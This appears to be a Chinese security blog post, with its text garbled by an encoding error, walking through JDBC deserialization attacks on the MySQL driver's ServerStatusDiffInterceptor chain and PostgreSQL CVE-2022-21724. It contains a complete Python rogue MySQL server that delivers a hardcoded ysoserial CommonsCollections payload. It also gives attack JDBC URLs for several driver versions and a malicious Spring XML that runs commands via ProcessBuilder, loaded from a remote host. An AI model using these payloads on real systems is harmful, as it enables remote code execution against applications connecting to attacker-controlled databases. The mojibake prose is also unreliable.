å…ˆåˆ¤æ–­æ˜¯å¦ä¸ºåºåˆ—åŒ–å¯¹è±¡ï¼Œæ˜¯çš„è¯æ‰èƒ½å¤Ÿè¿›å…¥å¹¶è°ƒç”¨readObjectæ–¹æ³• æŸ¥æ‰¾getObjectçš„ç”¨æ³• åœ¨com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()ä¸­è°ƒç”¨äº†ï¼Œè·Ÿè¿›çœ‹çœ‹ï¼š è·Ÿè¿›ResultSetUtil.resultSetToMap(toPopulate, rs);ï¼Œè°ƒç”¨äº†getObjectæ–¹æ³• å¾ˆå¥½ï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦ææ¸…æ¥šä¸Šé¢çš„toPopulateå’Œrsç©¶ç«Ÿæ˜¯ä»€ä¹ˆå°±å¯ä»¥äº† toPopulateæ˜¯ä¸€ä¸ªMapç±»å‹çš„æ•°æ® rså®é™…ä¸Šæ˜¯æœåŠ¡ç«¯æ‰§è¡ŒSQLè¯­å¥SHOW SESSION STATUSåè¿”å›çš„ç»“æœï¼Œé‚£ä¹ˆè¿™å°±è®©æˆ‘ä»¬ä¸ç”±å¾—è”æƒ³æ¶æ„mysqlæœåŠ¡ç«¯äº†ï¼Œå¦‚æœæœ‰è¿™ä¹ˆä¸€ä¸ªevil mysqlï¼Œå¯ä»¥æ§åˆ¶rsçš„å€¼ï¼Œé‚£ä¹ˆå¯èƒ½å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–é“¾äº† æˆ‘ä»¬å›åˆ°å‰é¢çš„getObjectæ–¹æ³•ä¸­ï¼Œåœ¨åˆ¤æ–­æ˜¯å¦æ˜¯åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è¿˜è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œæ ¡éªŒautoDeserializeçš„å€¼æ˜¯å¦ä¸ºtrueï¼Œè¿™ä¹Ÿæ˜¯JDBC URLä¸­ä¸ºå•¥è¦ç‰¹åœ°å£°æ˜è¯¥å€¼ä¸ºtrueçš„åŸå›  Mysqlè®¤è¯æŠ¥æ–‡å…ˆå†™ä¸€æ‰‹å®¢æˆ·ç«¯ä»£ç  package org.example;import java.sql.*;public class Client public static void main(String[] args) throws ClassNotFoundException, SQLException String Driver = com.mysql.cj.jdbc.Driver; String DB_URL = jdbc:mysql://127.0.0.1:3306/admin?characterEncoding=utf8useSSL=falsequeryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptorautoDeserialize=trueserverTimezone=GMT%2B8; Class.forName(Driver); Connection conn = DriverManager.getConnection(DB_URL,root,123456); ç„¶åè¦ç”¨wiresharkè¿›è¡ŒæŠ“åŒ…ï¼Œå› ä¸ºæ˜¯æŠ“æœ¬åœ°çš„åŒ…ï¼Œæ‰€ä»¥è¿‡æ»¤å™¨è¦é€‰æ‹©è¿™ä¸ª è¿‡æ»¤æ¡ä»¶ä¸ºtcp.port ==3306 mysqlï¼š ä¸éš¾å‘ç°å…¶å®mysqlä¹Ÿæ˜¯æœ‰ç±»ä¼¼tcpä¸€æ ·çš„è®¤è¯ç³»ç»Ÿçš„ï¼Œæœ‰Requestå’ŒResponseï¼Œç®€å•çš„çœ‹ä¸€ä¸ªResponse OKåŒ…ï¼š MYSQL Protocolå°±æ˜¯è®¤è¯æŠ¥æ–‡äº†ä¸º0700000200000002000000ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ¶æ„æœåŠ¡ç«¯åªéœ€è¦å°†è¯¥æ•°æ®è¿”å›ç»™Requestå³å¯å®Œæˆè®¤è¯ï¼Œå†çœ‹çœ‹é—®å€™(greeting)æŠ¥æ–‡ï¼š ç›´æ¥å‘é€åŸå§‹æ•°æ®å³å¯ï¼Œæ¶æ„æœåŠ¡ç«¯å¯ä»¥å°†è¿™éƒ¨åˆ†æ”¹ä¸ºæ¶æ„payloadï¼Œä¹‹åè¿›è¡Œååºåˆ—åŒ– ServerStatusDiffInterceptoré“¾8.0.7-8.0.20ä¸Šé¢è®²çš„å…¶å®å°±æ˜¯è¯¥é“¾ æ‰€ä»¥æˆ‘ä»¬ç»§ç»­é¡ºç€ä¸Šé¢çš„æ€è·¯èµ°ï¼Œéœ€è¦å‡†å¤‡ä¸€ä¸ªæ¶æ„mysqlæœåŠ¡ç«¯ï¼š import socketimport binasciiimport osgreeting_data=4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400response_ok_data=0700000200000002000000def receive_data(conn): data = conn.recv(1024) print([*] Receiveing the package : .format(data)) return str(data).lower()def send_data(conn,data): print([*] Sending the package : .format(data)) conn.send(binascii.a2b_hex(data))def get_payload_content(): #fileæ–‡ä»¶çš„å†…å®¹ä½¿ç”¨ysoserialç”Ÿæˆçš„ ä½¿ç”¨è§„åˆ™ java -jar ysoserial [common7é‚£ä¸ª] calc a file= ra if os.path.isfile(file): with open(file, rb) as f: payload_content = str(binascii.b2a_hex(f.read()),encoding=utf-8) print(open successs) else: print(open false) #calc payload_content=aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878 return payload_content# ä¸»è¦é€»è¾‘def run(): while 1: conn, addr = sk.accept() print(Connection come from :.format(addr[0],addr[1])) # 1.å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡ send_data(conn,greeting_data) while True: # ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ 1.å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ 2.æœåŠ¡ç«¯å“åº”response_ok receive_data(conn) send_data(conn,response_ok_data) #å…¶ä»–è¿‡ç¨‹ data=receive_data(conn) #æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å· if session.auto_increment_increment in data: _payload=01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000 send_data(conn,_payload) data=receive_data(conn) elif show warnings in data: _payload = 01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000 send_data(conn, _payload) data = receive_data(conn) if set names in data: send_data(conn, response_ok_data) data = receive_data(conn) if set character_set_results in data: send_data(conn, response_ok_data) data = receive_data(conn) if show session status in data: mysql_data = 0100000102 mysql_data += 1a000002036465660001630163016301630c3f00ffff0000fc9000000000 mysql_data += 1a000003036465660001630163016301630c3f00ffff0000fc9000000000 # ä¸ºä»€ä¹ˆæˆ‘åŠ äº†EOF Packet å°±æ— æ³•æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿï¼Ÿ //è·å–payload payload_content=get_payload_content() //è®¡ç®—payloadé•¿åº¦ payload_length = str(hex(len(payload_content)//2)).replace(0x, ).zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] //è®¡ç®—æ•°æ®åŒ…é•¿åº¦ data_len = str(hex(len(payload_content)//2 + 4)).replace(0x, ).zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + 04 + fbfc+ payload_length_hex mysql_data += str(payload_content) mysql_data += 07000005fe000022000100 send_data(conn, mysql_data) data = receive_data(conn) if show warnings in data: payload = 01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000 send_data(conn, payload) breakif __name__ == __main__: HOST =0.0.0.0 PORT = 3309 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´ sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(start fake mysql server listening on :.format(HOST,PORT)) run() ä¸Šé¢pocçš„ç¼–å†™ä¸­ï¼Œé™¤äº†show session statusçš„å“åº”åŒ…å¤–ï¼Œå‰©ä¸‹çš„åŒ…éƒ½å¯ä»¥ç›´æ¥æŒ‰æµé‡åŒ…æ€»çš„æ•°æ®ç›´æ¥æŠ„è¿‡æ¥çš„ show session statuså“åº”åŒ…çš„ç¼–å†™åˆšå¼€å§‹è§‰å¾—æ˜¯ä¸éœ€è¦äº†è§£MYSQLç§æœ‰åè®®çš„ï¼Œç»“æœæˆ‘é”™äº†ã€‚å¦‚æœè¦è‡ªå·±ç¼–å†™POCï¼Œè¿˜æ˜¯è¦çœ‹å¾—æ‡‚çš„ã€‚è¿™é‡Œä¼šç®€å•åˆ†æä¸€ä¸‹ã€‚ä»æµé‡ä¸­å¯ä»¥çœ‹å‡ºæ¥show session statuså±äºrequest Query æŠ¥æ–‡ã€‚å¯¹äºæŸ¥è¯¢æ•°æ®åŒ…çš„å“åº”åŒ…å¯ä»¥åˆ†ä¸ºå››ç§ï¼šé”™è¯¯åŒ…ï¼ˆERR Packetï¼‰ã€æ­£ç¡®åŒ…ï¼ˆOK Packetï¼‰ã€ Protocol::LOCAL_INFILE_Requestã€ç»“æœé›†ï¼ˆProtocolText::Resultsetï¼‰ã€‚æˆ‘ä»¬ä¸Šé¢çœ‹åˆ°çš„Response OKæ•°æ®åŒ…å°±æ˜¯OK packetã€‚è¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ä¸»è¦æ˜¯ç”¨çš„æ˜¯ç»“æœé›†è¿™ä¸ªæ•°æ®åŒ…ã€‚è¿™é‡Œç»™å‡ºå®˜æ–¹ä¾‹å­ç»“æœé›†å“åº”åŒ…çš„ç»“æ„å¦‚å›¾æ‰€ç¤º ä¸Šé¢çš„å®˜æ–¹å›¾è¯´æ˜äº†ä¸€ä¸ªç»“æœé›†å“åº”åŒ…çš„ç»“æ„ã€‚ æ•°æ®æ®µ1ï¼šè¯´æ˜ä¸‹é¢çš„ç»“æœé›†æœ‰å¤šå°‘åˆ— æ•°æ®æ®µ2ï¼šåˆ—çš„å®šä¹‰ æ•°æ®æ®µ3ï¼š EOF åŒ… æ•°æ®æ®µ4ï¼šè¡Œæ•°æ® æ•°æ®æ®µçš„ç»“æ„ä¹Ÿæ˜¯ç›¸ä¼¼çš„ã€‚ é•¿åº¦ï¼ˆ3å­—èŠ‚ï¼‰ åºå·ï¼ˆ1å­—èŠ‚ï¼‰ åè®®æ•°æ®ï¼ˆä¸åŒåè®®ï¼Œæ•°æ®ä¸åŒï¼‰ æ•°æ®æ®µ1å°±å¯ä»¥å†™æˆ01 00 00 01 02 å‰ä¸‰å­—èŠ‚è¡¨ç¤ºæ•°æ®é•¿åº¦ä¸º1ï¼Œsequence idä¸º1ï¼Œæœ€åä¸€å­—èŠ‚02è¡¨ç¤ºæœ‰ä¸¤åˆ—ï¼ˆå› ä¸ºå°è¯•å†™ä¸€åˆ—æ— æ³•æ­£å¸¸è¿è¡Œï¼‰ æ•°æ®æ®µ2åˆ—çš„å®šä¹‰å°±æ¯”è¾ƒå¤æ‚äº†ã€‚æ‹¿æˆ‘å†™å¥½çš„æ•°æ®ç›´æ¥åˆ†æå§1a000002036465660001630163016301630c3f00ffff0000fcffff000000 1a 00 00 //3å­—èŠ‚è¡¨ç¤ºé•¿åº¦ï¼ˆè¿™ä¸ªé•¿åº¦è¯´çš„æ˜¯åè®®çš„å†…å®¹é•¿åº¦ï¼Œä¸åŒ…æ‹¬åºå·é‚£ä¸€å­—èŠ‚ï¼‰02 //åºå· å› ä¸ºæ˜¯ç¬¬äºŒä¸ªæ•°æ®å­—æ®µ03646566 // è¿™ä¸ªå°±æ˜¯defçš„æ„æ€00 //schema åè®®å› ä¸ºä¸ä½¿ç”¨å°±ç”¨0001 63 //table å› ä¸ºæˆ‘ä»¬ä½¿ç”¨åˆ—æ•°æ®ï¼Œå°±ä¸éœ€è¦åå­—äº†ï¼Œä¸‹é¢å‡ ä¸ªéƒ½æ˜¯ä»»æ„å­—ç¬¦ã€‚å­—ç¬¦ä¸²ç¬¬ä¸€å­—èŠ‚æ˜¯ç”¨æ¥è¯´æ˜é•¿åº¦çš„01 63 //org_table 01è¡¨ç¤º1å­—èŠ‚ï¼Œ63æ˜¯æ•°æ®0163 //name 0163 //org_name0c filler // length of the following fields æ€»æ˜¯0x0c3f00 //characterset å­—ç¬¦ç¼–ç  003fæ˜¯binary ffff0000 column_length //å…è®¸æ•°æ®æœ€å¤§é•¿åº¦ï¼Œå°±æ˜¯æˆ‘ä»¬è¡Œæ•°æ®çš„æœ€å¤§é•¿åº¦ã€‚fffffc //column_type è¿™ä¸€åˆ—æ•°æ®ç±»å‹ fcè¡¨ç¤ºblob 9000 //flags 9000ç”¨çš„å®˜æ–¹çš„ pocå¯ä»¥è¿è¡Œã€‚ çœ‹fnmsdçš„è¦å¤§äº128å¥½åƒã€‚00 //decimals0000 //filler_2 æˆ‘çš„POCæ²¡æœ‰å†™ EOFåŒ…ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåŠ ä¸Šå°±æ— æ³•å¤ç°æˆåŠŸã€‚ï¼ˆå¸Œæœ›æœ‰äººè§£ç­”ï¼‰ æ•°æ®å­—æ®µ4å°±æ˜¯POCäº†ã€‚POCå…¶å®å’Œä¸Šé¢ä¸€æ ·çš„ã€‚è®¡ç®—å‡ºé•¿åº¦ï¼ˆ3å­—èŠ‚ï¼‰åºå·ï¼ˆ1å­—èŠ‚ï¼‰è¡Œæ•°æ®ï¼ˆè¡Œæ•°æ®ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯æ•°æ®çš„é•¿åº¦ï¼‰ POCä½¿ç”¨ysoserial ã€‚ java -jar ysoserial [common7é‚£ä¸ª] calc a æœ‰äº†ä¸Šé¢çš„çŸ¥è¯†å†å»çœ‹POCå°±å¾ˆç®€å•äº† å®¢æˆ·ç«¯ä»£ç  import java.sql.*;public class Client public static void main(String[] args) throws ClassNotFoundException, SQLException String driver = com.mysql.cj.jdbc.Driver; String DB_URL = jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8useSSL=falsequeryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptorautoDeserialize=true;//8.xä½¿ç”¨ Class.forName(driver); Connection conn = DriverManager.getConnection(DB_URL); ç”±äºä¸Šé¢æ¶æ„mysqlæœåŠ¡ç«¯ç”¨ä¸Šçš„æ˜¯ccé“¾ï¼Œæ‰€ä»¥è¦ç¡®ä¿å®¢æˆ·ç«¯ä»£ç å¤„æœ‰æ·»åŠ ccä¾èµ–ï¼ˆç¬”è€…æ¼äº†è¿™ä¸€ç‚¹å¯¼è‡´å½“åˆè¢«å¡äº†å¥½ä¹…ï¼‰ è·Ÿç€è°ƒè¯•ä¸€æ‰‹ è·Ÿè¿›getConnectionæ–¹æ³• åˆè°ƒç”¨äº†ä¸€ä¸ªgetConnectionæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿› ä¸€ç›´å¾€ä¸‹èµ° è·Ÿè¿›connectæ–¹æ³• ç»§ç»­è·Ÿè¿›getInstanceæ–¹æ³• åˆå§‹åŒ–ConnectionImplï¼Œå‚æ•°hostInfoå°±æ˜¯æ¶æ„mysqlæœåŠ¡ç«¯çš„ä¸€äº›æ•°æ® è·Ÿè¿›ï¼Œå‰é¢å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯åˆå§‹åŒ–ä»¥åŠèµ‹å€¼ï¼Œè¿›å…¥initializeSafeQueryInterceptors();åˆå§‹åŒ–è¯·æ±‚ç›‘å¬å™¨ å†å¾€ä¸‹èµ°åˆ°createNewIOæ–¹æ³• è·Ÿè¿›å» è·Ÿè¿›connectTryOnlyæ–¹æ³•ï¼Œå¾€ä¸‹èµ°åˆ°æ­¤å¤„ è·Ÿè¿›å»ï¼Œå‘ç°æ‹¦æˆªå™¨æ˜¯æˆ‘ä»¬åœ¨å‚æ•°queryInterceptorsæŒ‡å®šçš„ServerStatusDiffInterceptorç±» è¿”å›ï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œç»§ç»­åˆå§‹åŒ–initializePropsFromServer(); è·Ÿè¿›å»ï¼Œå¾€ä¸‹èµ° è·Ÿè¿›handleAutoCommitDefaults(); è°ƒç”¨setAutoCommitæ–¹æ³•ï¼Œè·Ÿè¿›å»ï¼Œç»§ç»­å¾€ä¸‹èµ° è°ƒç”¨execSQLæ‰§è¡ŒSQLè¯­å¥ï¼Œè·Ÿè¿›ï¼Œå¾€ä¸‹èµ° å‘é€SQLè¯·æ±‚æ•°æ®åŒ…ï¼Œè·Ÿè¿›sendQueryStringæ–¹æ³• è·Ÿè¿› è°ƒç”¨invokeQueryInterceptorsPreæ–¹æ³•ï¼Œè·Ÿè¿› è°ƒç”¨preProcessæ–¹æ³•ï¼Œå…¶å‚æ•°sqlå°±æ˜¯è®¾ç½®autocommitçš„å€¼ä¸ºtrueï¼Œè·Ÿè¿› è·Ÿè¿›populateMapWithSessionStatusValuesæ–¹æ³• ç†Ÿæ‚‰å§ï¼Œå°±æ˜¯å‰é¢æˆ‘ä»¬æåˆ°çš„æ¼æ´ç‚¹ è°ƒç”¨ResultSetUtil.resultSetToMap(toPopulate, rs)ï¼Œè¿™é‡Œçš„rså°±æ˜¯æ¶æ„çš„SQLæœåŠ¡ç«¯è¿”å›çš„æ•°æ® ç„¶åå°±æ˜¯è°ƒç”¨getObjectè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™å°±æ˜¯æœ€å¼€å§‹åˆ†æçš„ä¸€æ¡é“¾å­ï¼Œè¿™é‡Œçš„jdbcç‰ˆæœ¬æ˜¯8,ä½ç‰ˆæœ¬å¤§è‡´æµç¨‹ä¹Ÿæ˜¯è¿™æ ·ï¼Œåªæœ‰å°‘æ•°å¼‚åŒç‚¹ï¼Œä½†æœ€åéƒ½æ˜¯è¿›å…¥getObjectæ–¹æ³•è§¦å‘ååºåˆ—åŒ– 5.1.0-5.1.10String url = jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=truestatementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptoruser=yso_CommonsCollections4_calc;String username = yso_CommonsCollections4_calc;String password = ;Class.forName(com.mysql.jdbc.Driver);conn = DriverManager.getConnection(url,username,password);String sql = select database();PreparedStatement ps = conn.prepareStatement(sql);//æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼Œè¿”å›çš„æ˜¯æ•°æ®åº“ç»“æœé›†çš„æ•°æ®è¡¨ResultSet resultSet = ps.executeQuery(); payloadå¦‚ä¸Š 5.1.11-5.x.xxString url = jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=truestatementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptoruser=yso_CommonsCollections4_calc;String username = yso_CommonsCollections4_calc;String password = ;Class.forName(com.mysql.jdbc.Driver);conn = DriverManager.getConnection(url,username,password); 6.xString url = jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=truestatementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptoruser=yso_CommonsCollections4_calc;String username = yso_CommonsCollections4_calc;String password = ;Class.forName(com.mysql.jdbc.Driver);conn = DriverManager.getConnection(url,username,password); 8.20ä»¥åè¿™ä»¥åè¿›å…¥populateMapWithSessionStatusValuesåä¸ä¼šå†è°ƒç”¨getObjectï¼Œå› æ­¤ç›´æ¥GG detectCustomCollationsé“¾è¯¦è§ï¼šhttps://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%89%E3%80%81detectCustomCollations%E9%93%BE æ„Ÿè§‰åˆ©ç”¨èŒƒå›´ä¸æ˜¯å¾ˆå¤§ï¼Œå…ˆæ—·ï¼Œåé¢æœ‰ç”¨åˆ°å†å­¦ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ PostgreSQLpostgresqlç®€å•ä½¿ç”¨ï¼šhttps://www.runoob.com/postgresql/windows-install-postgresql.html åŒç†PostgreSQLçš„propertyä¹Ÿå­˜åœ¨å®‰å…¨é—®é¢˜CVE-2022-21724 åœ¨ PostgreSQL æ•°æ®åº“çš„ jdbc é©±åŠ¨ç¨‹åºä¸­å‘ç°ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å½“æ”»å‡»è€…æ§åˆ¶ jdbc url æˆ–è€…å±æ€§æ—¶ï¼Œä½¿ç”¨ PostgreSQL æ•°æ®åº“çš„ç³»ç»Ÿå°†å—åˆ°æ”»å‡»ã€‚ pgjdbc æ ¹æ®é€šè¿‡ authenticationPluginClassNameã€sslhostnameverifierã€socketFactory ã€sslfactoryã€sslpasswordcallback è¿æ¥å±æ€§æä¾›ç±»åå®ä¾‹åŒ–æ’ä»¶å®ä¾‹ã€‚ä½†æ˜¯ï¼Œé©±åŠ¨ç¨‹åºåœ¨å®ä¾‹åŒ–ç±»ä¹‹å‰æ²¡æœ‰éªŒè¯ç±»æ˜¯å¦å®ç°äº†é¢„æœŸçš„æ¥å£ã€‚è¿™å¯èƒ½å¯¼è‡´é€šè¿‡ä»»æ„ç±»åŠ è½½è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“èŒƒå›´ï¼š 9.4.1208 PgJDBC 42.2.25 42.3.0 PgJDBC 42.3.2 è¿™é‡Œä¸»è¦è®°å½•ä¸¤ä¸ªç‚¹ socketFactory socketFactoryArg ç­‰propertyè°ƒç”¨æœ‰å‚æ„é€ è§¦å‘çš„RCE loggerLevel loggerFile æ—¥å¿—åŠŸèƒ½å†™æ–‡ä»¶ æ‰€éœ€ä¾èµ– dependencies !-- PostgreSQL JDBC é©±åŠ¨ï¼ˆæ¼æ´ç‰ˆæœ¬ï¼‰ -- dependency groupIdorg.postgresql/groupId artifactIdpostgresql/artifactId version42.3.1/version /dependency !-- Spring ä¸Šä¸‹æ–‡ï¼ˆç”¨äºè§£ææ¶æ„ XMLï¼‰ -- dependency groupIdorg.springframework/groupId artifactIdspring-context/artifactId version5.3.16/version /dependency/dependencies socketFactorysocketFactoryArgæ¶æ„xmlæ–‡ä»¶ï¼Œåˆ©ç”¨äº† Spring æ¡†æ¶çš„ä¾èµ–æ³¨å…¥æœºåˆ¶æ¥æ‰§è¡Œ Windows ç³»ç»Ÿå‘½ä»¤ï¼ˆå¼¹å‡ºè®¡ç®—å™¨ calc.exeï¼‰ beans xmlns=http://www.springframework.org/schema/beans xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xmlns:p=http://www.springframework.org/schema/p xsi:schemaLocation=http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd !-- Windows ç¯å¢ƒä¸‹è°ƒç”¨ calc.exe -- bean id=exec class=java.lang.ProcessBuilder init-method=start constructor-arg list valuecmd/value value/c/value valuecalc.exe/value /list /constructor-arg /bean/beans æµ‹è¯•ä»£ç  public class AttackPgsqlsocketFactory public static void main(String[] args) throws Exception String URL = jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContextsocketFactoryArg=http://127.0.0.1:8001/calc.xml; DriverManager.registerDriver(new Driver()); Connection connection = DriverManager.getConnection(URL); connection.close(); è°ƒè¯• å †æ ˆå¦‚ä¸‹ï¼š instantiate:62, ObjectFactory (org.postgresql.util)getSocketFactory:39, SocketFactoryFactory (org.postgresql.core)openConnectionImpl:184, ConnectionFactoryImpl (org.postgresql.core.v3)openConnection:51, ConnectionFactory (org.postgresql.core)init:225, PgConnection (org.postgresql.jdbc)makeConnection:466, Driver (org.postgresql)connect:265, Driver (org.postgresql)getConnection:664, DriverManager (java.sql)getConnection:270, DriverManager (java.sql)main:14, AttackPgsqlsocketFactory (org.example) è·Ÿè¿›getConnectionæ–¹æ³•ä¹‹åï¼Œä¸€ç›´å¾€ä¸‹èµ° è·Ÿè¿›connectæ–¹æ³•ï¼Œå‰é¢åšäº†ä¸€å®šçš„åˆ¤æ–­ä¹‹åï¼Œå¾€ä¸‹èµ° è·Ÿè¿›parseURLæ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯å¯¹jdbcå­—ç¬¦ä¸²è¿›è¡Œå¤„ç† ä»¥indexof?ä½œä¸ºåˆ†å‰²ç¬¦ï¼Œæ‹¿åˆ°propertieså‚æ•°ï¼Œåç»­å°†ç»“æœä¿å­˜ä¸ºPropertieså¯¹è±¡è¿”å› 